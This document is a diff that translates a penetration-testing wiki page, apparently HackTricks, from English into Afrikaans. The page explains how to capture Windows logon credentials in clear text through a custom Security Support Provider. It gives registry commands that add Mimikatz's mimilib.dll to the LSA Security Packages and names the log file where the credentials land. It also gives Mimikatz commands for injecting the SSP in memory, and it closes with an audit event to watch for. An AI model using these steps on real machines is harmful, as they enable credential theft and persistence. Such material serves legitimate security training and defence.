@@ -4,44 +4,37 @@
 
 ### Custom SSP
 
-[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
-You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.
+[Leer wat 'n SSP (Security Support Provider) hier is.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
+Jy kan jou **eie SSP** skep om **in te vang** in **duidelike teks** die **akkrediteerings** wat gebruik word om toegang tot die masjien te verkry.
 
 #### Mimilib
 
-You can use the `mimilib.dll` binary provided by Mimikatz. **This will log inside a file all the credentials in clear text.**\
-Drop the dll in `C:\Windows\System32\`\
-Get a list existing LSA Security Packages:
-
+Jy kan die `mimilib.dll` binêre gebruik wat deur Mimikatz verskaf word. **Dit sal alle akkrediteerings in duidelike teks in 'n lêer log.**\
+Laat die dll val in `C:\Windows\System32\`\
+Kry 'n lys bestaande LSA Veiligheid Pakkette:
 ```bash:attacker@target
 PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
-    Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
+Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-
-Add `mimilib.dll` to the Security Support Provider list (Security Packages):
-
+Voeg `mimilib.dll` by die Veiligheidsondersteuningsverskaffer lys (Veiligheidspakkette):
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
+En na 'n herlaai kan alle geloofsbriewe in duidelike teks gevind word in `C:\Windows\System32\kiwissp.log`
 
-And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`
+#### In geheue
 
-#### In memory
-
-You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
-
+Jy kan dit ook direk in geheue inspuit met Mimikatz (let op dat dit 'n bietjie onstabiel/nie werkend kan wees):
 ```powershell
 privilege::debug
 misc::memssp
 ```
+Dit sal nie herlaai oorleef nie.
 
-This won't survive reboots.
+#### Versagting
 
-#### Mitigation
-
-Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
+Event ID 4657 - Oudit skepping/wijziging van `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
 
 {{#include ../../banners/hacktricks-training.md}}
-
